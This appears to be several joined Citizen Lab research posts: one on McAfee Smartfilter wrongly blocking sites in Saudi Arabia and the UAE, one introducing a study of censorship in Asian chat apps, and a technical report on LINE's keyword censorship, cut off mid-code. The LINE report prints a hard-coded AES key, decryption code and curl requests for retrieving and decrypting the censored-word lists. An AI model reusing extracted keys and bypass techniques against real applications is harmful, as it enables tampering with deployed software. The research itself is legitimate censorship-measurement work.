Smartfilter is only known to be used in Saudi Arabia and in UAE for customers of Etisalat, one of the UAE’s two main Internet providers. (The other Internet provider in the UAE, a telecom company known as “du”, uses the Canadian-made Netsweeper filter.)\nMcAfee maintains a centralized database of site categorizations. All Smartfilter customers download periodic updates to the database. If a site is newly categorized or re-categorized in Smartfilter’s database, these updates will be pushed out to customers usually within 24 hours. The Citizen Lab confirmed in summer 2013 that Smartfilter was still in use in Saudi Arabia and on UAE Etisalat by creating new websites and submitting them to Smartfilter to be blocked. The Citizen Lab verified that the sites became blocked in Saudi Arabia and on UAE Etisalat a few days later, while a control group of similar websites created at the same time did not become blocked.\nNetwork administrators can choose the categories of sites to be blocked by Smartfilter. Our current tests indicate that Smartfilter is being used in Saudi Arabia and on UAE Etisalat with the “pornography” category blocked. We tentatively believe that the “nudity” category is also blocked in both Saudi Arabia and UAE since two sites in our sample—http://www.antgallery.org and http://www.midwivesofmaine.org—were classified under “nudity” (but not “pornography”) on trustedsource.org and were also found to be blocked while testing in both countries. With a sample size of just two sites, however, we decline to draw any definitive conclusions.\nOur results also suggest that other related SmartFilter categories—such as “incidental nudity”, “sexual materials,” and “provocative attire”—are probably not blocked, with the exception of “incidental nudity,” which was is blocked in UAE but not Saudi Arabia (see below). For each of those categories, we found sites which trustedsource.org classified in that category, but  were still available in both countries:\n \n\nThe sites http://www.bearyouth.org, http://www.harborhouse.org, and http://www.naturalbirthcenter.com are all categorized on trustedsource.org under “sexual materials.” While these are probably errors, the sites themselves do not appear to have any sexual content. The sites are not blocked in Saudi Arabia or on UAE Etisalat.\n\n \n \n\nThe sites http://www.blog.fr, http://www.angelaguevara.org, http://www.mccullagh.org and http://www.vnvmc-wi.org were all categorized as “incidental nudity.” These four sites were all accessible in Saudi Arabia in our testing, but were blocked on UAE Etisalat. This suggests that UAE Etisalat has enabled the “incidental nudity” category whereas Saudi Arabia has not.\n\n \n \n\nThe sites http://www.arabimagefoundation.org, http://www.ariana.org and http://www.hoopgirl.com/ are all classified under the “provocative attire” category. They are not blocked in either country.\n\n \nUsing an ad hoc combination of domain name sampling and automated web spidering, we found over 100 sites that were mistakenly classified as “pornography” by Smartfilter, and hence were blocked in Saudi Arabia and on UAE Etisalat as of writing. As our testing could only sample a small portion of the Web, our list should not be taken to represent more than a  fraction of sites misclassified by Smartfilter.\nFor most domain names, it was impossible to discern why the sites may have been classified as “pornography.” In some cases, how,  probable reasons for blocking could be reasonably inferred. Some blocked sites were using domain names that sounded as if they might have previously been registered as pornographic websites. The Internet Archive’s “Wayback Machine” can be used to check whether any such domains might have hosted pornographic content in the past. Through the site, we checked the history of six domains whose names sounded as if they could plausibly have been used to host pornography: bearyouth.org, bigmatt.com, caseydonovan.org, easyaction.com, gerl.org, and theteacherspet.com. Of these, we found that bearyouth.org, easyaction.com and gerl.org all hosted adult content at some point in the past when the domains had different owners. It is reasonable to assume that most of the other domain names in our sample—such as 14thbrooklyn.org (The Society for the Historical Preservation of the Fourteenth Brooklyn) and FreeInTheAbingtons.org (a guide to low-cost recreational activities in Northeastern Pennsylvania)—are unique enough that it is unlikely they were previously owned by other parties, much less by pornographic websites.\nSome sites were likely blocked due to the presence of a “trigger word” appearing in their domain name. The sites http://www.AgainstPornography.org and http://www.SearchingForMySpermDonorFather.org were presumably blocked because of the occurrence of the words “porn” and “sperm.” ScunthorpeGilbertAndSullivan.org (a Gilbert and Sullivan Society based in Scunthorpe, England) was presumably blocked due to the presence of the word “cunt” in the domain name. (This particular word filtering error is so common that it is known as the “Scunthorpe problem”.) BigHornBasinSFW.org, the website for the Big Horn Basin, Wyoming chapter of Sportsmen for Fish & Wildlife, was presumably blocked because of the inclusion of the string “nsfw” (“not suitable for work”), an acronym commonly used to indicate pornographic or otherwise workplace-inappropriate content.\nThe following is a sample of websites that we found to be blocked in Saudi Arabia and UAE Etisalat as a result of the site being misclassified by Smartfilter as pornography. Testing in Saudi Arabia was performed over October 16-17, 2013 on a VPN connection using HideMyAss Pro software, connected through an IP address registered to “National Computer Systems Co.” in Riyadh. We re-tested on November 27th using a connection through the King Abdulaziz City For Science And Technology, and found the sites listed below were all still blocked. Testing from within the UAE was performed on November 3rd, 2013 by an anonymous volunteer. When a blocked site was accessed from within Saudi Arabia, it would display this page indicating that the site had been blocked. When a blocked site was accessed on UAE Etisalat, it would bring up this error page, displaying the message:\n\nIt is not clear whether this page is intended to mislead users into thinking the website is temporarily down (as opposed to being blocked by the ISP). While the error message seems to indicate a temporary failure, the title of the error page (clearly visible in the screen capture linked above) is listed as “Blocked URL”. It is also not clear why the error message is displayed in English.\nIn our list of sites below, each entry is accompanied by a screen capture of the site being categorized on McAfee’s trustedsource.org site as pornography, along with a screen capture of the site being blocked from within Saudi Arabia. We did not collect screen captures of blocking within UAE, other than the single screen capture linked above, due to the time constraints on our volunteer tester preventing the collection of every site. Smartfilter might change its classifications of these sites after this post is published; the most current classifications can be looked up using McAfee’s form at http://trustedsource.org/en/feedback/url?action=checksingle.\nFor each list entry, the letters “ts” are linked to a screen capture of the site’s categorization on McAfee’s trustedsource.org site, and the letters “sa” are linked to a screen capture of the site being blocked in Saudi Arabia.\n\nhttp://www.14thbrooklyn.org(ts)(sa): A historical society dedicated to the history of the 14th Regiment, New York State Militia.\nhttp://www.905realestate.com(ts)(sa): Website of a real estate agent in the 905 area code of Toronto, Canada.\nhttp://www.abve.org(ts)(sa): American Board of Vocational Experts, a professional credentialing body.\nhttp://www.accessinfo.org(ts)(sa): A clearing house of information about poverty in Washington State.\nhttp://www.adoptacicam.org(ts)(sa): A Spanish-language adoption information site.\nhttp://www.againstpornography.org(ts)(sa): An anti-pornography site.\nhttp://www.aialafayette.org(ts)(sa): The Acadiana Indian Association, a Native American cultural organization in the Acadiana region of Louisiana.\nhttp://www.alsadiqin.org(ts)(sa): A site about common heritage of Islam and Judaism.\nhttp://www.amitayu.org(ts)(sa): The Amitayu Buddhist Society of Taiwan\nhttp://www.angularism.org(ts)(sa): A travel photoblog.\nhttp://www.annieoakley.org(ts)(sa): An information site about animal service, therapy, and rescue organizations.\nhttp://www.antgallery.org(ts)(sa): An art gallery based in Seattle, Washington.\nhttp://www.antons.org(ts)(sa): The home page of Jan-Niklas Antons.\nhttp://www.aquapurewater.com(ts)(sa): A water conditioning company.\nhttp://www.argun.org(ts)(sa): A Turkish news site.\nhttp://www.art-com.org(ts)(sa): A Polish graphic design company website, including a design portfolio.\nhttp://www.askjane.org(ts)(sa): A corporate training and development firm.\nhttp://www.asutra.org(ts)(sa): A Japanese company selling water from Mount Fuji.\nhttp://www.atacess.org(ts)(sa): A Japanese fortune-teller’s website.\nhttp://www.auricle.org(ts)(sa): A UK-based higher education blog.\nhttp://www.babele.org(ts)(sa): An Italian site about medieval instruments.\nhttp://www.balticsail.org(ts)(sa): A site promoting sailing in the Baltic Sea.\nhttp://www.barenboimsaidusa.org(ts)(sa): A youth orchestra featuring musicians from Israel, Palestine, and various Arab countries.\nhttp://www.bdc.org(ts)(sa): The Business Development Bank of Canada.\nhttp://www.bellyshots.com(ts)(sa): A photography studio focusing exclusively on portraits of pregnant women.\nhttp://www.big-cats.org(ts)(sa): A German site about the protection of big cat species.\nhttp://www.bighornbasinsfw.org(ts)(sa): Sportsmen for Fish & Wildlife, Bighorn Basin Wyoming chapter.\nhttp://www.bigmatt.com(ts)(sa): Home page of Matthew Salazar.\nhttp://www.botsis.com(ts)(sa): Website for an island guest house in Greek.\nhttp://www.bpronline.org(ts)(sa): A German-language finance magazine.\nhttp://www.braai.com(ts)(sa): A site about an effort to create a national common heritage day in South Africa.

reports on Internet censorship in countries that practice nationwide Internet filtering have focused on the censorship of political content, adult websites, social networking, and media sharing sites such as Facebook and YouTube. This focus is logical since the blocking of these websites is likely to have a far greater impact on users than the blocking of relatively obscure sites. For the sake of thoroughness, however, we should not ignore the large numbers of sites that are blocked in censored countries simply because they have been misclassified by the manufacturer of the blocking program being used.\n\nThe author thanks Adam Senft and Helmi Noman of Citizen Lab for helping to collect data for this report, and thanks the anonymous tester in the United Arab Emirates who helped to test the accessibility of websites through Etisalat.\n\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF  I Read on ISSUU\nIntroduction\nAcross Asia, a new class of instant messaging (IM) mobile applications are rapidly growing in popularity and amassing enormous user bases. These applications encompass more than text, voice, and video chat as they offer social networking platforms that include expressive emoticons and stickers (known as “emoji”), photo and video sharing, e-commerce, gaming, and other features that provide a more sophisticated user experience than previous generations of IM clients.\nCurrently, the three most popular chat applications developed by companies based in Asia are WeChat (developed by Tencent Holdings Ltd., based in China), LINE (developed by LINE Corporation, based in Japan1), and KakaoTalk (developed by Kakao Corporation, based in South Korea). These applications are not just dominating their respective domestic marketplaces, but are also expanding into markets in countries across Asia and beyond the region.\nThe growth of these applications and their strategies to attract an international user base raise questions regarding the kind of pressures they face in specific jurisdictions, particularly on implementing censorship or surveillance features and providing user data, and how they will respond to these demands.\nThis post is an introduction to a series of research reports analyzing information controls and privacy in mobile messaging applications used in Asia. Our series of reports will include analysis based on our technical investigation of censorship and surveillance, assessment on the use and storage of user data, and comparison of the terms of service and privacy policies of the applications. This series will begin with a focus on WeChat, LINE, and KakaoTalk.\nThe Rise of Asian Chat Apps\nWeChat, LINE, and KakaoTalk are all under three years old, but have become extremely popular in the short period that has passed since their release. All three have user bases in excess of 100 million registered users, with each application adding millions of users per month.\nKakaoTalk\nKakaoTalk, founded by South Korea-based Kakao Corp., was released in March 2010 and now has 110 million users, with over 40 percent of those users based outside of South Korea. Kakao Corporation was founded by Kim Beom Soo who was formerly CEO of NHN Corporation. While its user population is impressive it is relatively low compared to the growth of WeChat and LINE, which have been faster to focus efforts on international expansion than KakaoTalk.\nWeChat\nFollowing its launch as Weixin (微信) in January 2011, Tencent’s WeChat has seen its popularity soar, in part due to its integration with the existing 700 million-strong user base of Tencent’s flagship portal QQ. WeChat is estimated to have over 600 million registered users, of which 271.9 million are active users of the application. This number is double the estimated registered user base of 300 million reported in January 2013, a sign of WeChat’s staggering growth.\nThe application has also been highly popular outside its home market of China. In recent reports Tencent claims that WeChat has attracted over 100 million overseas users, drawing from South and Southeast Asian markets including India, Thailand, and Malaysia. WeChat has also launched in Australia, Europe, Latin America, US, and Africa. A Tencent representative noted “We see the mobile Internet industry as the biggest chance to take our business abroad” and “Tencent is ready to enter the world stage”, as evident by their recruitment of international soccer superstar Lionel Messi as a spokesperson.\nLINE\nLINE, produced by LINE Corporation, a subsidiary of South Korea-based Naver Corporation, has similarly seen a rapid increase in its user base. Following its release in June 2011, the application now has 280 million registered users. Expanding outside of its original market of Japan, it has gained 18 million users in Thailand, 17 million in Taiwan, and 14 million in Indonesia. LINE launched a Chinese-branded version of the app, Lianwo (连我), in December 2012 in partnership with Qihoo 360 Technology Co., Ltd, a software company who develop a suite of products, including antivirus software, web browsers and a mobile applications store and management service. Through this arrangement Qihoo 360 has obtained a business license for LINE to operate in China with LINE providing a license to Qihoo 360 to promote and provide LINE services. The head of LINE’s Chinese division has stated that the company aims to be the second biggest mobile IM company in China, behind Tencent.\nLINE is publicly targeting a user base of 300 million users, and seeking to expand its reach outside of Asia to South America and Europe, including Spain where it already has 15 million users. LINE’s CEO Akira Morikawa has stated he hopes LINE will “become a universal language” and “serve as a communication infrastructure for billions of global smartphones”.\nInformation Controls and Privacy\nCitizen Lab has previously examined censorship and surveillance in instant messaging clients used in China. In 2008, Citizen Lab researcher Nart Villeneuve documented surveillance and censorship of text messages in TOM-Skype (the version of Skype available in China) and found that millions of chat records were being collected and stored on a publicly accessible, unsecured server based in China. As a follow-up to this research and in collaboration with Professor Jedidiah Crandall and Jeffrey Knockel at the University of New Mexico, we reverse-engineered and analyzed the censorship and surveillance mechanisms of Sina UC, another Chinese chat client, and TOM-Skype. We were able to monitor changes to keywords that trigger censorship and surveillance for more than a year and a half. While these results provide a unique window into how censorship and surveillance features are implemented in two chat clients used in China, the popularity of these programs pales in comparison to WeChat, LINE and KakaoTalk, and they are only focused on text chatting and voice / video (in the case of TOM-Skype), rather than providing a social networking platform.\nMore recently, some Asian governments have explicitly endorsed measures to gain greater control over these IM applications in an effort to monitor private conversations. For example, in August 2013, the Royal Thai Police’s Technology Crime Suppression Division announced its plan to surveil LINE conversations to “ensure the rule of law, order and national security.” This proposal came after the police opened an investigation into four people for allegedly posting rumors on Facebook of a possible military coup. Although the police said that they would focus “only on suspicious activity and not pry into private conversations”, such moves raise further concerns over the privacy and safety of IM application users. Given that these applications are rapidly expanding their markets and growing their client base, an analysis of the extent of information controls that are present in these applications is needed.\nWeChat\nAll Chinese Internet companies are held responsible for the content they host and are expected to establish entire departments devoted to surveillance and censorship of their platforms’ users.\nTencent is one of China’s largest companies with a market capitalization of approximately USD 100 billion. The company—like many private sector actors in China—has a very close relationship with the Communist Party of China (CPC). For example, Ma Huateng, chairman and CEO of Tencent, recently became deputy of the National People’s Congress, the main legislative body of the state.\nDissidents and at-risk communities in China are uneasy regarding the increasing popularity of WeChat due to censorship and surveillance requirements that Internet companies are beholden to in the country, the dominance of the application in the domestic marketplace, and the close relationship between Tencent and the CPC. Chinese dissident Hu Jia expressed concerns that the domestic division of China’s Public Security Bureau is actively surveilling WeChat based on suspicions that security officers were following his movements through WeChat. In addition, there were reports from his colleagues that messages transmitted through WeChat were recited back to them by authorities in full detail almost immediately after they took place.\nWeChat has been named by Chinese law enforcement officials during recent crackdowns on “online rumors”, who stated that WeChat is “also a public space on the Internet….if you spread rumors or false information that you haven’t verified in a public space that is illegal”.\nThe Tibetan community also has concerns regarding surveillance of WeChat communications, especially as Tibetans living in Tibetan areas of China are subject to intensive surveillance and persecution by Chinese authorities. Despite growing evidence of privacy and security issues, Lobsang Gyatso of Tibet Action Institute and a member of our Cyber Stewards Network writes that distressingly Tibetans living both within Tibetan areas inside China and in exile have adopted WeChat as a convenient way to communicate and share information. Recent reports indicate that surveillance of WeChat is likely taking place as part of repressive actions from Chinese authorities against the Tibetan community. For example, a Tibetan woman was arrested by Chinese authorities in October 2013, who alleged that she expressed anti-Chinese sentiments over WeChat and stored prohibited photos of His Holiness the Dalai Lama on her mobile phone.\nWeChat’s use is expanding in countries with tense diplomatic relations with China, such as Taiwan, India, and Vietnam. Taiwanese opposition legislators expressed concerns that WeChat might threaten individual’s privacy and the island’s security if messages were spied upon. An unnamed Indian official said that the government was reviewing whether it should block access to WeChat over national security concerns. “But it is too premature to say whether this application will be banned,” the official added. Vietnam has also mulled banning chat apps like WeChat and LINE.\nDespite mounting concerns, WeChat surveillance mechanisms have not been verified technically. This lack of technical information is due to the fact that surveillance is typically impossible to measure, since it can be performed by the server and its effects are not visible outside that server. For blogs, microblogs, email, web searches, chat, and most other Internet applications, technically the server is most logical place to implement surveillance functions. The exception is peer-to-peer applications such as TOM-Skype. Based on our previous research on Chinese IM clients, only TOM-Skype and Sina UC were found to have surveillance and censorship features implemented on the client side. We suspect that server-side controls are the industry standard for Chinese IM programs.\nSurveillance provides users with no indication of its existence and is difficult to empirically verify, but censorship can be more easily observed and measured. WeChat is required to block sensitive keywords from its service like any other Internet service operating in China. However, unlike the majority of Chinese Internet applications, WeChat is successfully growing its user base outside of the country. Controversy arose when reports in January 2013 indicated that users outside of China were experiencing keyword censorship on WeChat. The keywords 南方周末 (nan fang zhou mo) “Southern Weekend”, which refers to an outspoken news outlet based in China, and 法轮功 (Falun Gong), which refers to the religious group, were found to trigger blocking notifications for users both within and outside China. Following media reports of this keyword censorship, Tencent responded that the blocking of users outside of China was a “technical glitch” and immediate actions to rectify it were underway.\nLINE\nCompared to other Asian IM applications, LINE is noted for its cultural sensitivity. Its emojis and stickers are customizable to cater to local customs and respond to the diverse nature of Asian societies. LINE in Indonesia, for instance, created stickers to celebrate the holy month of Ramadhan.\nConcerns have been raised about the privacy and security of user communications mediated by LINE. As previously mentioned, law enforcement in Thailand has expressed their intent to monitor LINE communications to “safeguard order, security and morality of Thailand”. But a response from LINE’s representatives suggested that such monitoring would only be permitted with a Japanese court order, stating, “We have not received an official request from the Thai government. However, LINE’s guidelines focus on user privacy and that’s the company’s priority”.\nIn light of these security and privacy issues, others have drawn attention to the lack of encryption used in messages sent in LINE over 3G networks, as well as the potential for group chat history to be obtained by a party intercepting these messages. Citizen Lab researchers verified that LINE chat traffic is sent unencrypted over 3G networks on the latest version of the client. This behaviour is unusual given the fact that the client does encrypt chat traffic over wifi connections. Mobile 3G networks are encrypted by default but this encryption is implemented at the carrier level, which means Internet service providers (ISPs) and telecoms have the means to decrypt traffic if desired. Commentators have speculated that LINE may have intentionally left 3G unencrypted to allow authorities to access data at the ISP level and thereby provide easier access to jurisdictions with restrictive communications regimes.\nKakaoTalk\nKakaoTalk has received less attention than WeChat or LINE, but privacy issues have been raised following reports that the application collected the MAC address of users, presenting a risk that user’s location information could be revealed. Kakao denied this claim and said that they use a hardware hash code as a means of preventing multiple downloads of the client. Kakao’s privacy practices were called into question following the use of KakaoTalk user data in several high profile police investigations. Following public concerns about the company’s retention of user data, Kakao announced that it would decrease the amount of time that messages are stored to as little as one day.\nAsia Chats Part 1: Investigating regionally-based keyword censorship in LINE\nThe first report in the Asia Chats series by Seth Hardy (Senior Security Analyst, Citizen Lab) examines the mechanisms behind keyword censorship in LINE for users based in China. On May 20, 2013, Twitter user @hirakujira (a Taiwanese iOS developer) reported the discovery of a list of 150 blocked words within the iPhone version of Lianwo (连我). This finding was prompted by a string in the program related to blocking capability. We explored if similar mechanisms were present in the latest versions of LINE available for Android. Reverse engineering of the most recent Android version of LINE (v3.9.3 downloaded directly from the Google Play store, current as of November 14, 2013) revealed that when the user’s country is set to China during installation of the application it will enable censorship functionality by downloading a list of censored words from Naver’s server, and then block the transmission of any messages that contain any of those keywords. The region data is encrypted in newer versions of LINE, likely due to users changing it in order to get free in-app downloadable content. The presence of censorship functionality has been confirmed as far back as v3.4.2, released on January 18 2013, using APK files found at AndroidDrawer. Lianwo was launched in December 2012, so given the data available to us it appears keyword censorship was enabled soon after the launch.\nIn our analysis, we were able to retrieve two lists from the server: Version 20 (223 keywords) and 21 (370 keywords), which suggests that there have been at least 21 iterations of the keyword block list.\nCitizen Lab Research Fellow Jason Q. Ng has translated both the original keyword list discovered by @hirakujira, and the latest versions we extracted from Chinese to English and describes the context behind them. The first keyword list discovered by @hirakujira is described in a series of blog posts (full list available here) and the most recent keyword list uncovered by Citizen Lab and translated by Ng is available here.\nThe first keyword list from @hirakujira contains content related to domestic Chinese politics, human rights, and sensitive political events–many of which are rather obscure and only mentioned in media known for being critical of the CPC. For example, 浙江签单哥 (Zhejiang’s receipt-signing Brother) refers to Zhejiang’s Vice Minister of Propaganda Bao Hongjun (鲍洪俊), who was accused by netizens of charging over 54 million yuan in expenses to his public office and illegally embezzling hundreds of millions in other corrupt activities. Netizens posted images of his receipts, which contained his signature, thus meriting him the nickname of “Zhejiang’s receipt-signing Brother.” However, it is unclear whether or not this is merely a fabricated rumor or contains a kernel of truth since no reliable sources have corroborated the few unofficial user forums that mention this supposed scandal. Thus, it raises questions as to who ordered or decided that such lightly-reported incidents merited positions on LINE’s list of keywords to be censored. The fact that some of these censored incidents are not high profile seems to indicate that they have been added by LINE as a pre-emptive, preventative measure.\nIt is unclear which version number is the list that @hirakujira uncovered, but since it was collected in May 2013, it is obvious the list is an older version than v20 and v21. Lists v20 and v21 extracted by the Citizen Lab are identical to each other except for the addition of 147 keywords to v21 that are all related to disgraced former CPC politician Bo Xilai.. The previously revealed keyword list and v21 have 40 keywords in common. Though the v21 list also contains its fair share of topical keywords related to specific current events, for the most part the keywords are much more general and refer to more well-known incidents than those found on the list that @hirakujira uncovered. Besides keywords related to the Bo Xilai scandal, other major categories of keywords include those related to the June 4 crackdown on Tiananmen Square, infighting or factions within the Communist Party, Falun Gong, and various controversies like the fatal Ferrari car crash that involved the son of a party official close to President Hu Jintao and Wen Jiabao’s secret wealth.\nOur research results introduce a number of open questions. Content filtering and surveillance is mandated by the CPC for Internet companies active in the Chinese market. The presence of regionally-based keyword censorship and its compliance with government regulations indicate that LINE is serious about expanding its user base in China. Indeed, it aims to be the second most popular IM application in China after WeChat. The relationship between LINE Corporation’s parent company Naver and Qihoo 360 reflects a regular practice of foreign companies partnering with domestic entities to provide services in the Chinese marketplace (as Skype did with TOM-Online, for example). Qihoo 360 appears serious about this partnership evidenced in part by mandating all employees to use LINE for work related discussions. It is likely that management of keyword censorship for users based in China is managed by Qihoo 360, but how this relationship functions in practice is unclear. Comparing the mechanism and targeted keywords for censorship in LINE with those practiced by Qihoo 360 and WeChat would be an interesting area for further research.\nIn our previous analysis of surveillance and censorship keyword lists in Sina UC and TOM-Skype, we found that in our total dataset of 4,256 unique keywords, there were only 138 terms (3.2 percent) shared between the two programs. Similarly, between the LINE keyword lists for v20 (223 keywords) and v21 (370 keywords), there are only 27 exact matches with keywords in the TOM-Skype and Sina UC dataset. However, many of the topics are similar (e.g. CPC officials, June 4, Falun Gong). The list extracted by @hirakujira has only three identical keywords in common with the dataset. They are the following: 北京频传江病危 (Běijīng pín chuán jiāng bìngwēi) “Frequent reports from Beijing that Jiang critically ill”, a reference to rumors of Jiang Zemin being severely sick; 网络封锁 (wǎngluò fēngsuǒ) “Internet blocked”; and 八九民主 (bājiǔ mínzhǔ) “Eighty-nine democracy”, a reference to June 4, 1989. The lack of matches between this list and the TOM-Skype and Sina UC lists make sense given the obscurity of the majority of the content. The keywords that do match are more general and reflect typical topics targeted for censorship by domestic Chinese products. This lack of overlap suggests that no common keyword list was provided to these companies by government authorities. Previous research on censorship in Chinese blog services and search engines localized for the Chinese market have found similar inconsistency between products. Overall, these findings further reinforce the validity of the speculation that Chinese companies may be given general guidelines from authorities on what types of content to target, but have some degree of flexibility on how to implement these directives.\nIn the case of LINE, we see a company actively trying to attract a diverse user base not only through culturally-relevant customizations (e.g. country-specific emojis and stickers), but also complying with government mandated information control regulations (e.g. in China). In addition, it is encountering pressures to provide user data to law enforcement (e.g. in Thailand) or risking being banned entirely (e.g. Vietnam). Conversely with WeChat, Tencent is encountering criticism for information controls within its domestic market and facing distrust in countries with poor relations with China. These challenges demonstrate the difficulty of operating in multiple jurisdictions and the unique characteristics of Asian markets with restrictive communications environments.\nAs Asian IM applications continue to grow in popularity at staggering rates, so too will governmental pressures to enact information controls and provide user data. The Citizen Lab will continue to analyze the rise and implications of these applications in the Asia Chats series.\nOur research outputs on regionally-based censorship in LINE include:\n\nDetailed technical report by Seth Hardy\nKeyword list translated from Chinese to English with contextual descriptions by Jason Q.

    "text": "\n\t\t\t\tDownload PDF I Read on ISSUU\nThis post has been updated November 19th, 2013 click here for updated content\nThis report describes the technical details of client-side censorship functionality in the LINE messenger client for Android, and a method for disabling it. This is the first in a series of research reports analyzing information controls and privacy in mobile messaging applications used in Asia. An introduction to the project can be found here.\nOn May 20, 2013, Twitter user @hirakujira reported finding a list of 150 blocked words within Lianwo (连我) , the Chinese version of the LINE application. This finding was prompted by a string in the program related to blocking capability. For more information on what specific keywords are being blocked, Jason Q. Ng translated the keyword lists from Chinese to English and describes context behind them. The first keyword list extracted by @hirakujira is described in a series of blog posts (full list available here) and the most recent keyword list uncovered by Citizen Lab and translated by Ng is available here.\nA more in-depth analysis of the international LINE client is motivated by similar messages such as this one in the application’s resource files (found at res/values*/strings.xml), which clearly indicates that it is not just the Lianwo version of LINE that censors messages within the application:\n<string name=”chathistory_chinese_user_word_error”>This message contains forbidden words and cannot be sent.</string>\nReverse engineering the LINE application reveals that when the user’s country is set to China, it will enable censorship functionality: it will download a list of censored words from Naver’s website, and then disallow sending any messages that contain any of those words, as well as replace those words with asterisks when received. The region data is encrypted in newer versions of LINE, likely due to users changing it in order to get free in-app downloadable content. Fortunately, it is still possible to disable censorship by changing the encrypted region.\nThe code analysis in this report was performed on LINE v3.8.5 for Android (APK MD5: 56c9076d56cc20f618df83eaf97a52dc), and the behavior was confirmed on an Android device running v3.9.3 downloaded directly from the Google Play store, current as of November 14, 2013. The presence of censorship functionality has been confirmed as far back as v3.4.2, released on January 18 2013, using APK files found at AndroidDrawer.\nRegion Settings\nWhen LINE is installed, it asks for the user’s country and phone number. The service will send a SMS to this phone number with a four digit code for verification. If the country code of the phone number and the region selected do not match, the program will display an error and suggest the user try again later.\n\nFigure 1: This screenshot shows an error message that is displayed to users in the registration menu if the  phone number and the region selected do not match.\nThis verification makes it difficult for researchers outside of China to test and verify censorship implemented in LINE.\nWord Lists\nThe application uses two URLs to retrieve a word list. The URLs are apparently not entered into the settings database if LINE is installed using a non-Chinese region, but can be found in the file app-config.properties at the root of the LINE .apk file. These URLs have been present since v3.4.2.\nThe URLs and their internal descriptions are:\nURL_CHINA_BAD_WORDS_INFO = http://line.naver.jp/app/resources/bwi\nURL_CHINA_BAD_WORDS = https://line.naver.jp/app/resources/bwraw\nThe file bwi has information on the version of the bad words file, containing a string that looks like this: 21,4320,v21, One interesting thing to note is that the file is not directly accessible over HTTP as referenced in the above URL without a user agent string being set to “Android Mobile LA/xx”, where xx is a location code. It is, however, accessible via HTTPS without the UA string:\n$ curl http://line.naver.jp/app/resources/bwi\n<!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML 2.0//EN”>\n<html><head>\n<title>302 Found</title>\n</head><body>\n<h1>Found</h1>\n<p>The document has moved <a href=”http://line.naver.jp/en”>here</a>.</p>\n</body></html>$ curl -A ‘Android Mobile LA/UK’ http://line.naver.jp/app/resources/bwi\n21,4320,v21,$ curl https://line.naver.jp/app/resources/bwi\n21,4320,v21,\nThe raw bad words file is not actually hosted at the above URL; the filename above has the version number appended to it. For example, the v21 file is hosted at https://line.naver.jp/app/resources/bwraw.v21. As of October 31, 2013, the files for v21 and v20 are available. The file can be accessed over HTTPS without the user agent string described above, and over HTTP with it.\nThe bad word files are Base64 encoded and encrypted using AES in cipher block chaining (CBC) mode with PCKS#7 padding. Decryption uses a static key stored in the binary:\n\n private static final byte[] key = {\n76, -86, -111, 47, -128, -21, 62, -44, 4, -91, 44, 60, 72, -46, 91, -42, -9, 46, -127, -110, -37, 85, -98, 73, -86, 27, -103, 103, -25, 81, 117, -89\n}; public static String decrypt(String encryptedFile) { try { byte[] encryptedBytes = Base64encoder.decode(encryptedFile); SecretKeySpec secretKey = new SecretKeySpec(key, “AES”);\nCipher c = Cipher.getInstance(“AES/CBC/PKCS7Padding”);\nc.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(new byte[16])); String decryptedWords = new String(c.doFinal(encryptedBytes), “UTF-8”); return decryptedWords; }\n\nFor reference, the 256-bit AES key is:\n\n4c aa 91 2f 80 eb 3e d4 04 a5 2c 3c 48 d2 5b d6\nf7 2e 81 92 db 55 9e 49 aa 1b 99 67 e7 51 75 a7\n\nDecrypted versions of these files are available here: [v20] and [v21].\nOnce downloaded, the bad words file is stored in the application’s cache directory as cbw.dat. If this list is unavailable, LINE will default to using a smaller internal list:\n\nprivate static Pattern g()\r\n  {\nFile localFile = new File(n.b().getApplicationContext().getCacheDir(), “cbw.dat”);\n    if (!localFile.exists())\r\n      try\r\n      {\nPattern localPattern2 = getInternalBadWords()1;\nreturn localPattern2; } catch (bwd localbwd2) { a(“failed getDefaultWords”, localbwd2); return null; }\n\nThe application also sets preference information on the downloaded word lists. The delay time of 10800000 milliseconds is equivalent to 3 hours:\n\nstatic void setWordListPreferences()\r\n  {\r\n    long l = System.currentTimeMillis();\r\n    SharedPreferences.Editor localEditor = bgb.a(bga.h).edit();\nlocalEditor.putLong(“word_list_update_delay”, 10800000L); localEditor.putLong(“word_list_update_date”, l); localEditor.putLong(“word_list_version”, 0L);\nlocalEditor.commit(); }\n\nThe internal list of censored words is also Base64 encoded and encrypted using the same key, and has remained unchanged since its introduction in 